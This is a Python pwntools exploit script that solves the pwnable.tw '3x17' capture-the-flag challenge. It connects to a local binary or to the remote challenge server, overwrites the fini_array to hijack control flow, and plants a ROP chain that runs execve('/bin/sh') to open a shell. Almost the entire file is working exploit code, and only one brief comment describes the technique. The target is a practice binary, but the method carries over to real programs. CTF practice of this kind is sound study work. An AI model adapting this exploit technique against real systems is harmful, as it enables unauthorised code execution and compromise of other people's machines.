#!/usr/bin/python

from pwn import *

"""
ROP based challenge. Techinique used was to
overwrite fini_array in order to gain EIP control
"""


p = process('./3x17') if '-r' not in sys.argv else remote('chall.pwnable.tw', 10105)
e = ELF('./3x17')

def write_to_addr(addr, data):
    p.sendlineafter('addr:', str(addr))
    p.sendafter('data:',data)


fini_addr = 0x00000000004b40f0
main_func_addr = 0x00401b6d
loop_fini = 0x00402960
main_ret_addr = 0x00401c4b


## GADGETS FOR ROP CHAIN
pop_rax = 0x000000000041e4af
pop_rdi = 0x0000000000401696
pop_rsi = 0x0000000000406c30
pop_rdx = 0x0000000000446e35
syscall = 0x00000000004022b4

## Overwrite addresses
bin_sh_addr = fini_addr + 0x80
rop_chain_addr = fini_addr + 0x10

rop_list = [pop_rax, 0x3b, pop_rdi, bin_sh_addr, pop_rsi, 0, pop_rdx, 0, syscall]

write_to_addr(fini_addr, p64(loop_fini) + p64(main_func_addr))

write_to_addr(bin_sh_addr, "/bin/sh\x00")


for i in xrange(len(rop_list)):
    write_to_addr(rop_chain_addr + 8*i, p64(rop_list[i]))

# gdb.attach(p)

write_to_addr(fini_addr, p64(main_ret_addr))

p.interactive()

